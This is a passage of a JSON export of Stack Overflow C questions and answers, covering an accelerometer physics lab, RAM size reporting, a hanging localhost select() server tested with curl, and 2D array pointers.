fflush(stdout);\n    }\n    secFall = ((end - start)/1000.0);\n    distance = metersFallen(secFall);\n    //percent = ; \n\n    printf(\"\\nTime falling was %6.3lf seconds\\n\", secFall);\n    printf(\"Distance fallen was %6.3lf meters\\n\", distance);\n    printf(\"Compensating for air resistance, the fall was %lf meters.\\n\", p);\n    //printf(\"This is %lf less than computed before\\n\", percent);\n    printf(\"%lf\\n\", mag(x,y,z));\n\n    return 0;\n\n}\n\ndouble metersFallen(double fallTime)\n{  \n\n    return(.5*GRAVITY*fallTime*fallTime);\n\n}\ndouble mag(double x, double y, double z)\n{\n\n    return sqrt(x*x+y*y+z*z);\n\n}\ndouble velocity (double v, double t1, double t2, double magAcc)\n{\n    int numVelocity = v + GRAVITY*(1-magAcc)*(t1 - t2)/1000;\n    return numVelocity;\n}\ndouble position (double x, double v, double t1, double t2)\n{\n    double p = x + v*(t1 - t2)/1000;\n    return p;\n}\n</code></pre>\n\n<p>Running with this sample data \n<a href=\"http://www.filedropper.com/lab6sampledata20131\" rel=\"nofollow\">http://www.filedropper.com/lab6sampledata20131</a></p>\n\n<p>I need the position function to work, but with Velocity returning zero I cannot. We are using a device with an accelerometer to run this. FYI I am a student who is fairly new to programming please be patient.</p>\n"}, {"tags": ["c", "linux", "memory"], "comments": [{"owner": {"reputation": 18827, "user_id": 1413133, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hqUmk.jpg?s=128&g=1", "display_name": "Manos Nikolaidis", "link": "https://stackoverflow.com/users/1413133/manos-nikolaidis"}, "edited": false, "score": 4, "creation_date": 1444843286, "post_id": 33131736, "comment_id": 54075021, "body": "<code>1GB = 1024MB = 1024*1024KB = 1024*1024*1024*1024 Bytes</code>   Except when it <a href=\"https://en.wikipedia.org/wiki/Kilobyte\" rel=\"nofollow noreferrer\">isn&#39;t</a>"}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 1, "creation_date": 1444843833, "post_id": 33131736, "comment_id": 54075328, "body": "Note: us an &quot;%llu&quot; format for printing an <i>unsigned</i> value."}, {"owner": {"reputation": 568, "user_id": 4157408, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a44b6a712c8ad167e7331cef927d46a2?s=128&d=identicon&r=PG&f=1", "display_name": "void_ptr", "link": "https://stackoverflow.com/users/4157408/void-ptr"}, "edited": false, "score": 0, "creation_date": 1444843849, "post_id": 33131736, "comment_id": 54075337, "body": "Buy 1000 MB of RAM, and get 24 MB for free!"}, {"owner": {"reputation": 715, "user_id": 3610102, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/999d4ac2d47c4de912caa36f13f9eb38?s=128&d=identicon&r=PG&f=1", "display_name": "Chirality", "link": "https://stackoverflow.com/users/3610102/chirality"}, "edited": false, "score": 0, "creation_date": 1444848453, "post_id": 33131736, "comment_id": 54078023, "body": "Well it appears Google does drop the 24 and I wasn&#39;t paying attention =S Thanks for the help guys.  8325185536 Bytes = 8130064KB"}], "answers": [{"tags": [], "owner": {"reputation": 165655, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "is_accepted": false, "score": 2, "last_activity_date": 1444847137, "creation_date": 1444847137, "answer_id": 33132880, "question_id": 33131736, "link": "https://stackoverflow.com/questions/33131736/memory-calculations-in-c/33132880#33132880", "title": "Memory Calculations in C", "body": "<p>For historical reasons, when reporting memory operating systems use units based on powers of 2 even though they don't use the correct SI prefixes for those units. So when it says \"8130064 kB\", it means 8,130,064 <a href=\"https://en.wikipedia.org/wiki/Kibibyte\" rel=\"nofollow\">KiB</a>, or 8,325,185,536 bytes.</p>\n"}], "owner": {"reputation": 715, "user_id": 3610102, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/999d4ac2d47c4de912caa36f13f9eb38?s=128&d=identicon&r=PG&f=1", "display_name": "Chirality", "link": "https://stackoverflow.com/users/3610102/chirality"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 106, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1444847137, "creation_date": 1444843138, "question_id": 33131736, "link": "https://stackoverflow.com/questions/33131736/memory-calculations-in-c", "title": "Memory Calculations in C", "body": "<p>I am trying to pull the actual memory of the computer and was wondering why there is a discrepancy between </p>\n\n<p>sysconf(_SC_PHYS_PAGES) * sysconf(_SC_PAGESIZE) and /proc/meminfo</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\n\nint main(){\n  unsigned long long ram = (sysconf(_SC_PHYS_PAGES) * sysconf(_SC_PAGESIZE));\n  printf(\"%lli = ram\\n\", ram);\n  return 0;\n}\n</code></pre>\n\n<p>Output = 8325185536</p>\n\n<p>8325185536 Bytes = 8.325185536 Gb</p>\n\n<pre><code>User &gt; cat /proc/meminfo\nMemTotal:        8130064 kB\n</code></pre>\n\n<p>8130064kB = 8.130064Gb</p>\n\n<p>0.195121536Gb off?</p>\n"}, {"tags": ["c", "sockets", "select", "curl", "network-programming"], "comments": [{"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444857380, "post_id": 33131365, "comment_id": 54083023, "body": "OT: For my taste your code layout is <i>too</i> condensed. I feel this is hard tor ead and therefore error-prone."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444858112, "post_id": 33131365, "comment_id": 54083353, "body": "Does the code compile without warnings with all warnings on (-Wall -Wextra -pedantic`)? If not fix it until no more warnings are issued."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444858896, "post_id": 33131365, "comment_id": 54083722, "body": "And (probably again): Do <i>not</i> rely on <code>recv()</code> returning as much data as it was told to. You want to read <code>recv()</code>&#39;s documentation closely."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444859017, "post_id": 33131365, "comment_id": 54083785, "body": "Also <code>trapsig()</code> misses the final <code>return</code>statement."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444859141, "post_id": 33131365, "comment_id": 54083840, "body": "Also^2 <code>accept()</code> (and even <code>socket()</code>) might very well return <code>0</code> as a valid descriptor. Use a value <code>&lt;0</code> (typically <code>-1</code>) to indicate an invalid descriptor. That is initialise <code>csock</code> to all <code>-1</code>s but <code>0</code>s."}, {"owner": {"reputation": 2016, "user_id": 5141989, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/3dPUW.jpg?s=128&g=1", "display_name": "Mike -- No longer here", "link": "https://stackoverflow.com/users/5141989/mike-no-longer-here"}, "reply_to_user": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444861790, "post_id": 33131365, "comment_id": 54084929, "body": "I swwitched from using select() to poll() and I had to use return values not documented in my manual to detect that data is ready"}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1444861875, "post_id": 33131365, "comment_id": 54084974, "body": "<code>while (recvsz == -2){</code> what is this supposed to do ?"}, {"owner": {"reputation": 2016, "user_id": 5141989, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/3dPUW.jpg?s=128&g=1", "display_name": "Mike -- No longer here", "link": "https://stackoverflow.com/users/5141989/mike-no-longer-here"}, "edited": false, "score": 0, "creation_date": 1444862625, "post_id": 33131365, "comment_id": 54085288, "body": "In my data receive function with that while statement, I was trying to read the first few bytes of data then let recv complete and ignore the rest of the data as it is irrelevant."}], "answers": [{"comments": [{"owner": {"reputation": 2016, "user_id": 5141989, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/3dPUW.jpg?s=128&g=1", "display_name": "Mike -- No longer here", "link": "https://stackoverflow.com/users/5141989/mike-no-longer-here"}, "edited": false, "score": 0, "creation_date": 1444861660, "post_id": 33135839, "comment_id": 54084876, "body": "My compiler didn&#39;t issue a warning"}, {"owner": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "reply_to_user": {"reputation": 2016, "user_id": 5141989, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/3dPUW.jpg?s=128&g=1", "display_name": "Mike -- No longer here", "link": "https://stackoverflow.com/users/5141989/mike-no-longer-here"}, "edited": false, "score": 0, "creation_date": 1444861832, "post_id": 33135839, "comment_id": 54084955, "body": "@Mike Did you enable them all? (Which compiler are you using?)"}, {"owner": {"reputation": 2016, "user_id": 5141989, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/3dPUW.jpg?s=128&g=1", "display_name": "Mike -- No longer here", "link": "https://stackoverflow.com/users/5141989/mike-no-longer-here"}, "edited": false, "score": 0, "creation_date": 1444862502, "post_id": 33135839, "comment_id": 54085239, "body": "I just ran &#39;gcc program.c&#39; on the command line. I don&#39;t use an ide"}, {"owner": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "reply_to_user": {"reputation": 2016, "user_id": 5141989, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/3dPUW.jpg?s=128&g=1", "display_name": "Mike -- No longer here", "link": "https://stackoverflow.com/users/5141989/mike-no-longer-here"}, "edited": false, "score": 0, "creation_date": 1444862781, "post_id": 33135839, "comment_id": 54085359, "body": "@Mike Try running <code>gcc -Wall program.c</code>"}], "tags": [], "owner": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "is_accepted": false, "score": 3, "last_activity_date": 1444857837, "creation_date": 1444857837, "answer_id": 33135839, "question_id": 33131365, "link": "https://stackoverflow.com/questions/33131365/my-c-program-is-frozen-upon-accepting-a-connection-when-tested-with-curl/33135839#33135839", "title": "My C program is frozen upon accepting a connection when tested with CURL", "body": "<p>Pay attention to warnings. This</p>\n\n<pre><code>    if(nsock=accept(asock, (struct sockaddr*)&amp;a, &amp;alen)&lt; 0)\n</code></pre>\n\n<p>is not parsed as you seem to expect. In fact it assigns <code>nsock</code> a result of comparison of <code>accept</code> return value vs 0 (which is <code>false</code> aka 0). You want some extra parenthesis:</p>\n\n<pre><code>    if ((nsock = accept(asock, (struct sockaddr*)&amp;a, &amp;alen)) &lt; 0)\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444858219, "post_id": 33135874, "comment_id": 54083410, "body": "<code>long csock[10] = {0};</code> would do also. No need for an extra call to <code>memset()</code>."}], "tags": [], "owner": {"reputation": 100407, "user_id": 16406, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/fadf252892475e9b177d5cd5e8b24145?s=128&d=identicon&r=PG&f=1", "display_name": "Chris Dodd", "link": "https://stackoverflow.com/users/16406/chris-dodd"}, "is_accepted": true, "score": 1, "last_activity_date": 1444857963, "creation_date": 1444857963, "answer_id": 33135874, "question_id": 33131365, "link": "https://stackoverflow.com/questions/33131365/my-c-program-is-frozen-upon-accepting-a-connection-when-tested-with-curl/33135874#33135874", "title": "My C program is frozen upon accepting a connection when tested with CURL", "body": "<p>This</p>\n\n<pre><code>long csock[11];memset(csock,0,11);\n</code></pre>\n\n<p>does not initialize <code>csock</code> completely -- just the first 11 bytes.  You want <code>memset(csock, 0, sizeof(csock));</code></p>\n"}], "owner": {"reputation": 2016, "user_id": 5141989, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/3dPUW.jpg?s=128&g=1", "display_name": "Mike -- No longer here", "link": "https://stackoverflow.com/users/5141989/mike-no-longer-here"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 101, "favorite_count": 0, "accepted_answer_id": 33135874, "answer_count": 2, "score": 0, "last_activity_date": 1444857963, "creation_date": 1444841966, "question_id": 33131365, "link": "https://stackoverflow.com/questions/33131365/my-c-program-is-frozen-upon-accepting-a-connection-when-tested-with-curl", "title": "My C program is frozen upon accepting a connection when tested with CURL", "body": "<p>I apologize if my code is extensively long, but I'm attempting to make a local server that handles multiple local clients. I even imported ideas from <a href=\"http://www.binarytides.com/multiple-socket-connections-fdset-select-linux/\" rel=\"nofollow\">http://www.binarytides.com/multiple-socket-connections-fdset-select-linux/</a> to try to get it to work with no success.</p>\n\n<p>I run it using 82 for a parameter, and see as expected:</p>\n\n<pre><code>Socket made and ready\nAccepting 10 users\n</code></pre>\n\n<p>I then use CURL to connect to 127.0.0.1:82 and curl stalls. In my program I see as expected:</p>\n\n<pre><code>CLIENT CONNECTION MADE on socket# 0!\n</code></pre>\n\n<p>But the problem is data isn't being sent from the server to the client.</p>\n\n<p>I tried forcing a break in CURL (via ctrl+c) to see if anything happened on the server and nothing did. I even tried using a web browser to connect and received similar results (a hang-up).</p>\n\n<p>If I force a break on the server (via ctrl+c), then I got what I expect, a disconnection message (like \"Empty Reply from server\" from CURL).</p>\n\n<p>What I expected to see in my browser is:</p>\n\n<pre><code>Error\n\nThis is a hack-ed-server\n</code></pre>\n\n<p>What could I be doing wrong here? I'm sort-of new to the select() calls so I'm not sure if I configured them correctly.</p>\n\n<p>Here's the code:</p>\n\n<pre><code>#include &lt;fcntl.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;sys/errno.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;time.h&gt;\n\nextern errno;\nlong asock=-1,nsock=-1;\n\nvoid end_app(int s){\n    struct sigaction si;\n    si.sa_handler=SIG_DFL;si.sa_flags=0;\n    sigaction(SIGCHLD,&amp;si,NULL);\n    sigaction(SIGTSTP,&amp;si,NULL);\n    sigaction(SIGTTOU,&amp;si,NULL);\n    sigaction(SIGTTIN,&amp;si,NULL);\n    sigaction(SIGSEGV,&amp;si,NULL);\n    sigaction(SIGTERM,&amp;si,NULL);\n    sigaction(SIGHUP,&amp;si,NULL);\n    char v[5000];\n    sprintf(v,\"Abrupt exit detected sig# %d. Closing sockets.\\n\",s);\n    write(1,v,strlen(v));\n    if (asock &gt; -1){close(asock);}\n    if (nsock &gt; -1){close(nsock);}\n}\n\nconst long trapsig(){\n    struct sigaction s,si;\n    si.sa_handler=SIG_IGN;si.sa_flags=0;\n    s.sa_handler=end_app;s.sa_flags=0;\n    sigaction(SIGCHLD,&amp;si,NULL);sigaction(SIGTSTP,&amp;si,NULL);sigaction(SIGTTOU,&amp;si,NULL);sigaction(SIGTTIN,&amp;si,NULL);\n    if (sigaction(SIGSEGV,&amp;s,NULL)==-1){printf(\"Cant trap signal!\\n\");return 1;}\n    if (sigaction(SIGTERM,&amp;s,NULL)==-1){printf(\"Cant trap signal!\\n\");return 1;}\n    if (sigaction(SIGHUP,&amp;s,NULL)==-1){printf(\"Cant trap signal!\\n\");return 1;}\n}\n\n//getreq params in:   req=external buffer for data\n//            reqsz=size of external buffer. I set 10000\n//            nsock=valid socket pointer from accept()\n//\n//getreq params out:  reqsz=actual size of data returned\n//\nvoid getreq(char* req,unsigned long *reqsz,long nsock){\n    //bufsize=how many bytes to read at once. High values like 5000 cause a stall.\n    //buffer=buffer of data from recv call\n    const unsigned long ibs=*reqsz,bufsize=5000;\n    char buffer[ibs],*rp=req;\n    //spacect=# of spaces in data read\n    //szct=iterator variable\n    //mysz=total length of returned data\n    //bufct=buffer counter to prevent segfault\n    //recvsz=data size returned from recv or\n    //       forced -2 if buffer hits capacity\n    //       or 2nd space in returned data is found\n    unsigned long spacect=0,szct=0,mysz=0,bufct=0;\n    long recvsz=1;char *p=buffer;\n    //\n    //Expected data: GET /whatever HTTP/x.x but we\n    //               want /whatever\n    //\n    //loop until 2nd space is found or \n    //ibs bytes of data have been processed\n    while (recvsz &gt; 0 &amp;&amp; bufct &lt; ibs){\n        recvsz=recv(nsock, p, bufsize, 0);\n        if (recvsz &lt; 1){break;}\n        for (szct=1;szct&lt;=recvsz;szct++){\n            if (*p==' '){spacect++;if (spacect &gt; 2){spacect=2;recvsz=-2;break;}}\n            if (spacect==1 &amp;&amp; *p != ' '){mysz++;if (mysz &lt;= *reqsz){*rp++=*p;}}\n            p++;bufct++;if (bufct &gt; ibs){recvsz=-2;break;}\n        }\n    }\n    // Process rest of data to try to avoid client errors\n    while (recvsz == -2){\n        recvsz=recv(nsock, buffer, bufsize, 0);\n    }\n    *reqsz=mysz;\n}\n\nint main(int argc,char* argv[]){\n    if (trapsig() &lt; 0){return 1;}\n    //set maximum users to 10 and allocate space for each\n    long maxusers=10;long csock[11];memset(csock,0,11);\n    //do sanity checks and bind local socket\n    if (!argv[1]){printf(\"Port # required\\n\");return 1;}\n    if ((asock=socket(AF_INET, SOCK_STREAM, 0)) &lt; 1){printf(\"Can't make socket! %s\\n\",strerror(errno));return 1;}\n    struct sockaddr_in a;\n    memset(&amp;a,0,sizeof(a));\n    a.sin_family=AF_INET;\n    a.sin_addr.s_addr=inet_addr(\"127.0.0.1\");\n    a.sin_port=htons(strtol(argv[1],NULL,10));\n    if (bind(asock,(struct sockaddr*)&amp;a, sizeof(a))==-1){printf(\"Can't bind socket! %s\\n\",strerror(errno));return 1;}\n    if (listen(asock,10) &lt; 0){printf(\"Can't listen! %s\\n\",strerror(errno));return 1;}\n    printf(\"Socket made and ready\\nAccepting %d users\\n\",maxusers);\n    while(1){\n        usleep(10); //sleep incase processor is overloaded\n        fd_set SR;long SMAX=asock,n,canadd=0;\n        FD_ZERO(&amp;SR);FD_SET(asock,&amp;SR);\n        for (n=0;n&lt;maxusers;n++){\n            if (csock[n] &gt; 0){FD_SET(csock[n],&amp;SR);}else{canadd=1;}\n            if (csock[n] &gt; SMAX){SMAX=csock[n];}\n        }\n        long act=select(SMAX+1,&amp;SR,0,0,0);\n        if (act != EINTR &amp;&amp; act &lt; 0){printf(\"Select error\\n\");}\n        if (canadd==1 &amp;&amp; FD_ISSET(asock,&amp;SR)){\n            //incoming connection detected\n            socklen_t alen=sizeof(a);\n            if (nsock=accept(asock, (struct sockaddr*)&amp;a, &amp;alen)&lt; 0){printf(\"Can't accept! %s\\n\",strerror(errno));close(asock);return -1;}\n            for (n=0;n&lt;maxusers;n++){if (csock[n]==0){csock[n]=nsock;break;}}\n            printf(\"CLIENT CONNECTION MADE on socket# %d!\\n\",n);\n            fcntl(nsock, F_SETFD, O_NONBLOCK);\n            //program reaches here when client first connects\n        }\n        for (n=0;n&lt;maxusers;n++){\n            if (csock[n] &gt; 0 &amp;&amp; FD_ISSET(csock[n],&amp;SR)){\n                //this section never seems to execute\n                unsigned long reqsz=10000;\n                char req[reqsz];\n                printf(\"Checking incoming data...\\n\",n);\n                getreq(req,&amp;reqsz,csock[n]);\n                if (reqsz &gt; 0){\n                printf(\"Received %d bytes\\nData: %s\\n\",reqsz,req);\n                const char buf[10000]={\"HTTP/1.0 200 OK\\nConnection: close\\nContent-type: text/html\\n\\n&lt;html&gt;&lt;head&gt;&lt;title&gt;hacked&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;H1&gt;Error&lt;/h1&gt;&lt;p&gt;This is a hack-ed-server&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\\n\\n\"};\n                send(csock[n],buf,strlen(buf),0);\n                }else{\n                printf(\"Received no data\\n\");\n                }\n                printf(\"Closing.\\n\");\n                close(csock[n]);\n                csock[n]=0;\n            }\n        }\n    }\n    printf(\"Closing sockets\\n\");\n    close(asock);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "pointers"], "comments": [{"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 1, "creation_date": 1444842023, "post_id": 33131225, "comment_id": 54074301, "body": "There are arrays of arrays, and arrays of pointers. You can use the latter to navigate a 2D-array-like structure without knowing the dimensions beforehand. You cannot use the former in C89, because you cannot even mention its type without knowing at least the inner dimension. In C99 and beyond you can use VLAs but they have their limitations."}, {"owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 0, "creation_date": 1444842372, "post_id": 33131225, "comment_id": 54074510, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/15062718/allocate-memory-2d-array-in-function-c\">Allocate memory 2d array in function C</a>"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1444842563, "post_id": 33131225, "comment_id": 54074609, "body": "@n.m.: <code>int (*p)[CONSTANT_LENGTH]</code> is a normal pointer to array, not a VLA or similar, so why would that not be C89 compliant (left aside that using C99 or C11 is a good idea in general)? Note that it is different from an array of pointers: <code>int *p[CONSTANT_DIM]</code>."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1444842842, "post_id": 33131225, "comment_id": 54074781, "body": "@Olaf it is of course compliant, but one needs to know CONSTANT_LENGTH beforehand, which is not what OP requested."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1444842995, "post_id": 33131225, "comment_id": 54074863, "body": "@n.m.: Sorry, I just read <code>dimension</code>, not the plural. Defining a pointer to VLA should work, however."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1444846801, "post_id": 33131225, "comment_id": 54077071, "body": "@n.m.: Why not use your 1st comment as an answer?"}], "answers": [{"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 2, "creation_date": 1444843419, "post_id": 33131315, "comment_id": 54075097, "body": "This is not a 2D array, but - a 1D-array of pointers and clearly not what OP ased for."}], "tags": [], "owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "is_accepted": false, "score": 0, "last_activity_date": 1444841802, "creation_date": 1444841802, "answer_id": 33131315, "question_id": 33131225, "link": "https://stackoverflow.com/questions/33131225/can-i-declare-a-pointer-to-a-2d-array-before-i-know-the-dimensions/33131315#33131315", "title": "Can I declare a pointer to a 2d array before I know the dimensions?", "body": "<pre><code>int(*p)[100];\n</code></pre>\n\n<p>This is not you want . This is pointer to array of <code>int</code>.</p>\n\n<p>What you want is pointer to pointer to <code>int</code>.</p>\n\n<pre><code>int **p;\np=malloc(sizeof(int *)*r);       // allocate memory for r number of int *\nfor(int i=0;i&lt;r;i++)\n    p[i]=malloc(sizeof(int)*c);  //  allocate memory to each pointer  \n</code></pre>\n\n<p><code>free</code> in similar manner.</p>\n"}, {"comments": [{"owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 0, "creation_date": 1444841902, "post_id": 33131318, "comment_id": 54074221, "body": "Why not <code>malloc(sizeof(int) * M * N)</code>?"}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "reply_to_user": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 0, "creation_date": 1444841981, "post_id": 33131318, "comment_id": 54074277, "body": "@cad You can do that too."}, {"owner": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "reply_to_user": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 0, "creation_date": 1444842190, "post_id": 33131318, "comment_id": 54074406, "body": "@cad, using <code>p = malloc(sizeof(int) * M * N)</code> you can not use array subscript <code>p[1][6] = 18;</code>"}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "reply_to_user": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "edited": false, "score": 1, "creation_date": 1444842254, "post_id": 33131318, "comment_id": 54074448, "body": "@AlterMann, You can do that too. See 